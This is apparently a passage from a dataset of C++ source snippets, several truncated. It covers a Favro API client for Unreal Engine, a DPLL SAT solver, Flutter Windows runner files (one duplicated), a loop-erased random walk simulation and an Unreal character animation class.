FBase64::Encode(UserCredentials);\n\tRequest->SetHeader(TEXT(\"Authorization\"), AuthorizationHeader);\n\n\tif (bWithOrgId && Settings->GetSelectedOrganization())\n\t{\n\t\tconst FString OrganizationId = Settings->GetSelectedOrganization().Id;\n\t\tRequest->SetHeader(TEXT(\"organizationId\"), OrganizationId);\n\t}\n}\n\nvoid FFavroMessenger::MakeOrganizationsRequest()\n{\n\tTSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n\tRequest->OnProcessRequestComplete().BindRaw(this, &FFavroMessenger::CompleteOrganizationsRequest);\n\n\tPrepareRequest(\"organizations\", false, Request);\n\n\tRequest->SetVerb(TEXT(\"GET\"));\n\tRequest->ProcessRequest();\n}\n\n\nvoid FFavroMessenger::MakeUsersRequest()\n{\n\tTSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n\tRequest->OnProcessRequestComplete().BindRaw(this, &FFavroMessenger::CompleteUserRequest);\n\n\tPrepareRequest(\"users\", true, Request);\n\n\tRequest->SetVerb(TEXT(\"GET\"));\n\tRequest->ProcessRequest();\n}\n\nvoid FFavroMessenger::MakeCollectionsRequest()\n{\n\tTSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n\tRequest->OnProcessRequestComplete().BindRaw(this, &FFavroMessenger::CompleteCollectionsRequest);\n\n\tFFavroRequestArgs Args;\n\tArgs.Add(\"archived\", \"false\");\n\tPrepareRequest(\"collections\", true, Request, Args);\n\n\tRequest->SetVerb(TEXT(\"GET\"));\n\tRequest->ProcessRequest();\n}\n\nvoid FFavroMessenger::MakeDashboardRequest(const FString& CollectionId)\n{\n\tTSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n\tRequest->OnProcessRequestComplete().BindRaw(this, &FFavroMessenger::CompleteDashboardRequest, CollectionId);\n\n\tFFavroRequestArgs Args;\n\tArgs.Add(\"collectionId\", CollectionId);\n\tArgs.Add(\"archived\", \"false\");\n\tPrepareRequest(\"widgets\", true, Request, Args);\n\n\tRequest->SetVerb(TEXT(\"GET\"));\n\tRequest->ProcessRequest();\n}\n\nvoid FFavroMessenger::MakeBoardsRequest(const FString& CollectionId)\n{\n\tTSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n\tRequest->OnProcessRequestComplete().BindRaw(this, &FFavroMessenger::CompleteBoardsRequest, CollectionId);\n\n\tFFavroRequestArgs Args;\n\tArgs.Add(\"collectionId\", CollectionId);\n\tArgs.Add(\"archived\", \"false\");\n\tPrepareRequest(\"cards\", true, Request, Args);\n\n\tRequest->SetVerb(TEXT(\"GET\"));\n\tRequest->ProcessRequest();\n}\n\nvoid FFavroMessenger::CompleteOrganizationsRequest(FHttpRequestPtr Request,\n                                                   FHttpResponsePtr Response,\n                                                   bool bWasSuccessful)\n{\n\tif (!(bWasSuccessful && Response.IsValid()))\n\t{\n\t\tOnOrganizationsRequestCompleted.ExecuteIfBound(false, TArray<FFavroOrganization>());\n\t\treturn;\n\t}\n\n\tTSharedPtr<FJsonObject> JsonObject;\n\tconst TSharedRef<TJsonReader<>> Reader = TJsonReaderFactory<>::Create(*Response->GetContentAsString());\n\n\tif (!(FJsonSerializer::Deserialize(Reader, JsonObject) && JsonObject.IsValid()))\n\t{\n\t\tOnOrganizationsRequestCompleted.ExecuteIfBound(false, TArray<FFavroOrganization>());\n\t\treturn;\n\t}\n\n\tTArray<FFavroOrganization> Organizations;\n\n\tconst TArray<TSharedPtr<FJsonValue>>* Entities;\n\tif (!JsonObject->TryGetArrayField(TEXT(\"entities\"), Entities))\n\t{\n\t\tOnOrganizationsRequestCompleted.ExecuteIfBound(false, TArray<FFavroOrganization>());\n\t\treturn;\n\t}\n\n\tfor (const TSharedPtr<FJsonValue>& Entity : *Entities)\n\t{\n\t\tTSharedPtr<FJsonObject> EntityObj = Entity->AsObject();\n\t\tFFavroOrganization Org;\n\n\t\tOrg.Id = EntityObj->GetStringField(TEXT(\"organizationId\"));\n\t\tOrg.Name = EntityObj->GetStringField(TEXT(\"name\"));\n\t\tif (EntityObj->HasField(TEXT(\"thumbnail\")))\n\t\t{\n\t\t\tOrg.ThumbnailUrl = EntityObj->GetStringField(TEXT(\"thumbnail\"));\n\t\t}\n\n\t\tconst TArray<TSharedPtr<FJsonValue>>* Users;\n\t\tif (!EntityObj->TryGetArrayField(TEXT(\"sharedToUsers\"), Users))\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\tfor (const TSharedPtr<FJsonValue>& UserValue : *Users)\n\t\t{\n\t\t\tTSharedPtr<FJso",
    "#include <algorithm>\n#include <errno.h>\n#include <fstream>\n#include <iostream>\n#include <set>\n#include <sstream>\n#include <string>\n#include <string.h>\n#include <vector>\n\n#define MAXVARS 1500\n\nusing std::vector;\nusing std::string;\nusing std::set;\n\nclass CNF {\n    int nvars;\n    bool empty = false;\n    vector<vector<int> > clauses;\n\n    // l - signed literal\n    bool is_pure(int l) const {\n        bool found = false;\n        for (const auto& v : clauses) {\n            for (int t : v) {\n                if (t == l) {\n                    found = true;\n                } else if (t == -l) {\n                    return false;\n                }\n            }\n        }\n        return found;\n    }\n\npublic:\n    static CNF* parse(const string& name) {\n        std::ifstream f(name);\n        if (f.fail()) {\n            std::cout << \"Cannot open file: \" << strerror(errno) << \"\\n\";\n            return nullptr;\n        }\n        string s;\n        int line = 0;\n        int nclauses;\n        string tmp;\n\n        CNF* result = new CNF();\n\n        while (1) {\n            line++;\n            std::getline(f, s);\n            if (s[0] == 'c')\n                continue;\n            if (s[0] == 'p')\n                break;\n            std::cout << \"Invalid DIMACS, unknown letter at line \" << line << \"\\n\";\n            return nullptr;\n        }\n        std::istringstream iss(s);\n        iss >> tmp >> tmp >> result->nvars >> nclauses;\n        if (result->nvars > MAXVARS) {\n            std::cout << \"too many vars\\n\";\n            exit(1);\n        }\n        for (int i = 0; i < nclauses; i++) {\n            vector<int> clause;\n            int literal;\n            std::getline(f, s);\n            std::istringstream iss(s);\n            set<int> used_literals; // for sanity checks\n            bool clause_always_true = false;\n\n            iss >> literal;\n            while (literal) {\n                if (used_literals.find(literal) != used_literals.end()) {\n                    iss >> literal;\n                    continue;\n                }\n                if (used_literals.find(-literal) != used_literals.end())\n                    clause_always_true = true;\n                used_literals.insert(literal);\n                clause.push_back(literal);\n                iss >> literal;\n            } while (literal);\n            if (!clause_always_true)\n                result->clauses.push_back(clause);\n        }\n        return result;\n    }\n\n    set<int> find_unit_clauses() const {\n        set<int> ret;\n        for (const auto& a : clauses) {\n            if (a.size() == 1)\n                ret.insert(a[0]);\n        }\n        return ret;\n    }\n\n    set<int> find_pure_literals() const {\n        set<int> ret;\n        for (int i = -nvars; i <= nvars; i++) {\n            if (i == 0) continue;\n            if (is_pure(i)) ret.insert(i);\n        }\n        return ret;\n    }\n\n    bool has_empty_clause() const { return empty; }\n    bool is_cnf_empty() const { return clauses.size() == 0; }\n\n    void propagate_var_single_value(int v) {\n        clauses.erase(std::remove_if(clauses.begin(), clauses.end(), [v](const vector<int>& c) { return std::find(c.begin(), c.end(), v) != c.end(); }), clauses.end());\n        for (auto& c : clauses) {\n            c.erase(std::remove_if(c.begin(), c.end(), [v](int l){ return l == -v; }), c.end());\n            if (c.size() == 0) {\n                empty = true;\n                return;\n            }\n        }\n    }\n\n    void propagate_var_values(const set<int>& vs) {\n        for (int v : vs) {\n            propagate_var_single_value(v);\n            if (empty)\n                break;\n        }\n    }\n\n    int select_branching_literal() {\n        return clauses[0][0];\n    }\n\n    bool solve_helper(vector<int>* acc) {\n        if (has_empty_clause()) return false;\n\n        // unit clauses\n        while (true) {\n            set<int> units = find_unit_clauses();\n            if (units.size() == 0) break;\n            if (units.size() > 1) {\n                for (int v : units) {\n                    if (units.find(-v) != units.end()) return false;\n                }\n            }\n            for (int v : units) acc->push_back(v);\n            propagate_var_values(units);\n            if (has_empty_clause()) return false;\n        }\n\n        // pure literals\n        while (true) {\n            set<int> lits = find_pure_literals();\n            if (lits.size() == 0) break;\n            for (int v : lits) acc->push_back(v);\n            propagate_var_values(lits);\n            if (has_empty_clause()) return false;\n        }\n\n        if (is_cnf_empty()) return true;\n\n        size_t acclim = acc->size();\n        int v = select_branching_literal();\n\n        // branching\n        {\n            // Create copy in heap, do not eat stack\n            CNF *cnf2 = new CNF(*this);\n            acc->push_back(v);\n            cnf2->propagate_var_single_value(v);\n            bool ret = cnf2->solve_helper(acc);\n            delete cnf2;\n            if (ret) return ret;\n        }\n\n        //",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <cstdlib>\n#include <bits/stdc++.h>\n#include <array>\n#include <cmath>\n#include <algorithm>\n#include <random>\n#include <numeric>\n#include <valarray>\n#include <vector>\n#include <set>\n#include <tuple>\nusing namespace std;\n\n\ndouble eucl_dist(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]);\n}\ndouble eucl_dist3D(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]+final_pos[2]*final_pos[2]);\n}\n\n\nvector<vector<int>> LERW(int n, int d, int limit)\n{\n    //Generates a loop erased random walk\n\n    //Vectors to save the walk \n    vector<vector<int>> coordinates;\n    vector<int> row(d);\n    set<vector<int>> checker;\n\n    //Append origin to all stores\n    coordinates.push_back(row);\n    checker.insert(row);\n    \n\n    //Counters\n    int length{1}, break_point{0}, index{0}, step;\n    double e2e{0};\n    //Initialise rng\n    default_random_engine generator(random_device{}());\n    uniform_int_distribution<int> direction(1,2*d);\n    while (length < n)\n    {\n        \n        if (break_point < limit)\n        {\n            break_point +=1;\n        }\n        else\n        {\n            break;\n        }\n        //Ensure length is set to the current LERW \n        length = coordinates.size();\n        \n        //Decide on step to take\n        step = direction(generator);\n\n        //Make step \n        if (step%2 == 0)\n        {\n            index = (step/2) -1;\n            row[index] += 1;\n        }\n        else if (step%2 !=0)\n        {   \n            step += 1;\n            index = (step/2) -1;\n            row[index] -= 1;\n        }\n        //Append to checker\n        checker.insert(row);\n\n        //Add 1 to the length \n        length +=1;\n\n        if (checker.size() != length)\n        {\n            checker.clear();\n            //Loop created, need to destroy loop \n            for (int ii=1;ii<length;ii++)\n            {\n                if (coordinates.back() != row)\n                {    \n                    coordinates.pop_back();\n                }\n                else \n                {\n                    //If the point has been found again then the loop has been removed, we now update the set \n                    for (int jj =0; jj<coordinates.size();jj++)\n                    {\n                        checker.insert(coordinates[jj]);\n                    }\n                    break;\n                }\n            }\n        }\n        else \n        {\n            coordinates.push_back(row);\n        }\n    }\n    cout << \"Length: \" << length << \"\\n\";\n    return coordinates;\n}\n\nvoid SaveWalk(vector<vector<int>> coordinates)\n{\n    //Used to save walk to a csv file for plotting \n    ofstream file;\n\n    //naming file to store results in\n    file.open(\"LERWTest.csv\");\n    for (int i = 0; i < coordinates.size(); i++) \n    { \n        for ( \n            auto it = coordinates[i].begin(); \n            it != coordinates[i].end(); it++) \n            file << *it << \",\"; \n        file << endl; \n    } \n    file.close();\n}\n\n\nint main()\n{\n    vector<vector<int>> LERW_Test;\n    int n = 1000;\n    int limit = n*n;\n    int d = 2;\n    double e2e{0};\n    LERW_Test = LERW(n,d,limit);\n    SaveWalk(LERW_Test);\n    \n    \n    //Values for avg\n    n = 100;\n    int total{50};\n\n    int step{10};\n\n    int counter{0};\n    int big_number{400};\n    \n\n    //Evaluating scaling coefficient of LERW by computing end to end distance \n\n    ofstream file;\n    file.open(\"e2eLERW2D.csv\");\n    for (int ii=0;ii<total;ii++)\n\n    {\n        limit = n*n*n;\n        e2e = 0;\n        counter = 0;\n        while (counter < big_number)\n        {\n            LERW_Test = LERW(n,d,limit); \n            if (LERW_Test.size() == n)\n            {\n                e2e += eucl_dist(LERW_Test.back())*eucl_dist(LERW_Test.back());\n                counter += 1;\n            }\n                \n        }\n        e2e = e2e/counter;\n\n        file << n << \",\" << e2e << \"\\n\";\n        n += step;\n    }\n    file.close();\n    \n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pollutrack24\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright 2024 jeonghun\n\n\n#include \"LLAnimInstance.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/Character.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Animation/AnimNodeReference.h\"\n#include \"AnimCharacterMovementLibrary.h\"\n#include \"AnimDistanceMatchingLibrary.h\"\n#include \"SequenceEvaluatorLibrary.h\"\n#include \"SequencePlayerLibrary.h\"\n#include \"AnimationStateMachineLibrary.h\"\n#include \"AnimExecutionContextLibrary.h\"\n#include \"KismetAnimationLibrary.h\"\n\nvoid ULLAnimInstance::NativeUpdateAnimation(float DeltaSeconds)\n{\n\tSuper::NativeUpdateAnimation(DeltaSeconds);\n\n\tif (const TObjectPtr<ACharacter> Owner = Cast<ACharacter>(GetOwningActor()))\n\t{\n\t\tCurrAcceleration = Owner->GetCharacterMovement()->GetCurrentAcceleration();\n\t\tPrevWorldLocation = WorldLocation;\n\t\tWorldLocation = Owner->GetActorLocation();\n\t\tPrevWorldRotation = WorldRotation;\n\t\tWorldRotation = Owner->GetActorRotation();\n\t\tWorldVelocity = Owner->GetVelocity();\n\t\tLastUpdateVelocity = Owner->GetCharacterMovement()->GetLastUpdateVelocity();\n\t\tbUseSeparateBrakingFriction = Owner->GetCharacterMovement()->bUseSeparateBrakingFriction;\n\t\tBrakingFrictionFactor = Owner->GetCharacterMovement()->BrakingFrictionFactor;\n\t\tGroundFriction = Owner->GetCharacterMovement()->GroundFriction;\n\t\tBrakingFriction = Owner->GetCharacterMovement()->BrakingFriction;\n\t\tBrakingDecelerationWalking = Owner->GetCharacterMovement()->BrakingDecelerationWalking;\n\t\tbIsOnGround = Owner->GetCharacterMovement()->IsMovingOnGround();\n\t\tbIsJumping = Owner->GetCharacterMovement()->MovementMode == MOVE_Falling && WorldVelocity.Z > 0;\n\t\tbIsFalling = Owner->GetCharacterMovement()->MovementMode == MOVE_Falling && WorldVelocity.Z <= 0;\n\t\tTimeToJumpApex = bIsJumping ? -WorldVelocity.Z / Owner->GetCharacterMovement()->GetGravityZ() : 0;\n\t\tTimeFalling = bIsFalling ? TimeFalling + DeltaSeconds : bIsJumping ? 0 : TimeFalling;\n\t\tbIsAnyMontagePlaying = IsAnyMontagePlaying();\n\t\tGroundDistance = GetGroundDistance(Owner);\n\t}\n}\n\nvoid ULLAnimInstance::NativeThreadSafeUpdateAnimation(float DeltaSeconds)\n{\n\tSuper::NativeThreadSafeUpdateAnimation(DeltaSeconds);\n\n\tUpdateLocationData(DeltaSeconds);\n\tUpdateRotationData();\n\tUpdateVelocityData();\n\tUpdateAccelerationData();\n\tUpdateRootYawOffset(DeltaSeconds);\n\n\tbIsFirstUpdate = false;\n}\n\nbool ULLAnimInstance::ShouldDistanceMatchStop() const\n{\n\treturn bHasVelocity && !bHasAcceleration;\n}\n\ndouble ULLAnimInstance::GetPredictedStopDistance() const\n{\n\treturn UAnimCharacterMovementLibrary::PredictGroundMovementStopLocation(\n\t\tLastUpdateVelocity,\n\t\tbUseSeparateBrakingFriction,\n\t\tBrakingFriction,\n\t\tGroundFriction,\n\t\tBrakingFrictionFactor,\n\t\tBrakingDecelerationWalking).Size2D();\n}\n\nvoid ULLAnimInstance::UpdateIdleTurnYawState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tFAnimationStateResultReference AnimationState;\n\tEAnimNodeReferenceConversionResult ConversionResult;\n\tUAnimationStateMachineLibrary::ConvertToAnimationStateResult(Node, AnimationState, ConversionResult);\n\tif (ConversionResult == EAnimNodeReferenceConversionResult::Succeeded)\n\t{\n\t\tif (UAnimationStateMachineLibrary::IsStateBlendingOut(Context, AnimationState))\n\t\t{\n\t\t\tTurnYawCurveValue = 0;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tRootYawOffsetMode = ERootYawOffsetMode::Accumulate;\n\t\t\tProcessTurnYawCurve();\n\t\t}\n\t}\n}\n\nvoid ULLAnimInstance::LandRecoveryStart(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tLandRecoveryAlpha = FMath::GetMappedRangeValueClamped(FVector2f(0, 0.4), FVector2f(0.1, 1.0), TimeFalling); \n}\n\nvoid ULLAnimInstance::SetupIdleState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tIdleBreakDelayTime = FMath::TruncToInt(FMath::Abs(WorldLocation.X + WorldLocation.Y)) % 10 + 6;\n\tTimeUntilNextIdleBreak = IdleBreakDelayTime;\n}\n\nvoid ULLAnimInstance::UpdateIdleState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tFAnimationStateResultReference AnimationState;\n\tEAnimNodeReferenceConversionResult ConversionResult;\n\tUAnimationStateMachineLibrary::ConvertToAnimationStateResult(Node, AnimationState, ConversionResult);\n\tif (ConversionResult == EAnimNodeReferenceConversionResult::Succeeded)\n\t{\n\t\tif (!UAnimationStateMachineLibrary::IsStateBlendingOut(Context, AnimationState))\n\t\t{\n\t\t\tif (CanPlayIdleBreak())\n\t\t\t{\n\t\t\t\tTimeUntilNextIdleBreak -= UAnimExecutionContextLibrary::GetDeltaTime(Context);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tTimeUntilNextIdleBreak = IdleBreakDelayTime;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid ULLAnimInstance::SetUpTurnInPlaceRotationState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tTurnInPlaceRotationDirection = FMath::Sign(RootYawOffset) * -1.f;\n}\n\nvoid ULLAnimInstance::SetUpTurnInPlaceRecoveryState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tTurnInPlaceRecoveryDirection = TurnInPlaceRotationDirection;\n}\n\nvoid ULLAnimInstance::SetUpStartState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tStartDirection = LocalVelocityDirection;\n}\n\nvoid U",
